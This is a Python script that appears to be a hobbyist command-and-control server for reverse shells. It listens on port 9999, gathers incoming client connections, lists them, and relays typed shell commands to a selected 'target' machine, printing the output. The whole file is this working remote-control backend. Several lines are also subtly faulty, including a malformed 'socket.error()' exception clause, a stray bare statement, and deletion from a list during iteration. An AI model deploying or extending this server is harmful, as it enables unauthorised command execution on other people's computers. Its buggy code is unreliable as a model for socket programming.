import socket
import sys
import threading
import time
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []

# create a socket  [connect two computers]


def create_socket():
    try:
        global host
        global port
        global s

        host = ""
        port = 9999
        s = socket.socket()

    except socket.error() as err:
        print("Socket creation error : " + str(err))


# binding the socket and listenin for connections
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the port : " + str(port) + "\n")

        s.bind((host, port))
        s.listen(5)

    except socket.error() as err:
        print("binding error : " + str(err) + "\n" + "retrying........")
        bind_socket()

# handle multiple connections


def accepting_connections():
    for c in all_connections:
        c.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            conn, address = s.accept()
            s.setblocking(1)          # prevents timeout
            all_connections.append(conn)
            all_addresses.append(address)

            print("Connection has been established: " +
                  "IP : " + address[0], "Port : " + str(address[1]))

        except:
            print("Error accepting connections : ")

        # # Accepting the connections with the client

        # def socket_accept():
        #     conn, address = s.accept()
        #     print("Connection has been established: " +
        #           "IP : " + address[0], "Port : " + str(address[1]))

        #     send_commands(conn)
        #     conn.close()

        # def send_commands(conn):
        #     while True:
        #         cmd = input(">> ")

        #         if cmd == "quit":
        #             conn.close()
        #             s.close()
        #             sys.exit()

        #         if len(str.encode(cmd)) > 0:
        #             conn.send(str.encode(cmd))
        #             client_res = str(conn.recv(1024), "utf-8")
        #             print(client_res, end="")

        # def main():
        #     create_socket()
        #     bind_socket()
        #     socket_accept()

        # main()


def start_custom_shell():

    while True:
        cmd = input(">> ")
        # list out all the connections
        if cmd == "connections":
            show_all_connections()

        elif "select" in cmd:
            conn = get_target(cmd)

            if conn is not None:
                send_target_commands(conn)

        else:
            print("Command not recognised as a valid : ")


# listing all the connections currently active
def show_all_connections():

    # result = ""

    for i, conn in enumerate(all_connections):
        try:
            conn.send(str.encode(' '))
            conn.recv(20480)
            print("connection found :")

        except:
            s
            del all_connections[i]
            del all_addresses[i]
            print("connection not found :")
            continue

        print(str(i) + "\t" +
              str(all_addresses[i][0]) + "\t" + str(all_addresses[i][1]) + "\n")


def get_target(cmd):
    try:
        target = cmd.replace("select ", "")
        target = int(target)
        conn = all_connections[target]

        print("Connected to : " + "IP : " +
              str(all_addresses[target][0]) + "PORT : " + str(all_addresses[target][1])+"\n")
        print(str(all_addresses[target][0]) + ">> ", end="")

        return conn
    except:
        print("Invalid choice :: \n")
        return None


def send_target_commands(conn):
    while True:

        try:
            cmd = input(">> ")

            if cmd == "quit":
                break

            if len(str.encode(cmd)) > 0:
                conn.send(str.encode(cmd))
                client_res = str(conn.recv(1024), "utf-8")
                print(client_res, end="")

        except:
            print("Error Sending commands :: \n")
            break

# creating two threads and assigning functions to it


def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=thread_function)
        t.daemon = True
        t.start()


def thread_function():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connections()

        if x == 2:
            start_custom_shell()

        queue.task_done()

# creating two tasks usig the queue


def create_tasks():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


create_threads()
create_tasks()
